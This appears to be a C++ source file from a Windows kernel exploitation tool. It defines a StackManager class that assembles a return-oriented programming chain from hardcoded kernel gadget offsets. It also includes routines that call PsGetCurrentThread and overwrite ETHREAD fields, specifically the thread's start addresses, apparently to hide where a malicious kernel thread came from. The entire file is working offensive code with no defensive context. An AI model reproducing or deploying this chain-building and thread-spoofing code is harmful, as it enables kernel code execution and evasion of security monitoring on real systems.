#include <include/stack/stack_manager.hpp>

std::uint64_t* StackManager::GetStackBuffer()
{
	return Stack->data();
}

std::size_t StackManager::GetStackSize()
{
	return Stack->size() * sizeof(std::uint64_t);
}

void StackManager::AddGadget(const std::uint64_t GadgetOffset)
{
	const std::uint64_t GadgetAddress = KernelModuleBase + GadgetOffset;
	Stack->push_back(GadgetAddress);
}

void StackManager::AddValue(const std::uint64_t Value)
{
	Stack->push_back(Value);
}

void StackManager::AddPadding(const std::size_t PaddingSize)
{
	// TODO: Make this a cyclic func.
	// right now it's just hardcoded.
	this->AddValue(0xC0FEBABEC0FEBABE);
}

void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
{
	this->AddFunctionCall("PsGetCurrentThread");
	this->AddGadget(0x256c4a); // pop rcx; ret;
	this->AddValue(FieldOffset); // Offset inside of ETHREAD we want to write to
	this->AddGadget(0x28efa4); // add rax, rcx; ret;
	this->AddGadget(0x2f7921); // pop r8; ret;
	this->AddValue(NewValue); // New value we write to the field
	this->AddGadget(0x3c3a81); // mov qword ptr [rax], r8; ret;
}

void StackManager::ModifyThreadStartAddress(const std::uint64_t NewStartAddress)
{
	constexpr std::uint64_t EThreadStartAddressOffset = 0x4e0;
	constexpr std::uint64_t EThreadWin32StartAddressOffset = 0x560;
	this->ModifyThreadField(EThreadStartAddressOffset, NewStartAddress);
	this->ModifyThreadField(EThreadWin32StartAddressOffset, NewStartAddress);
}
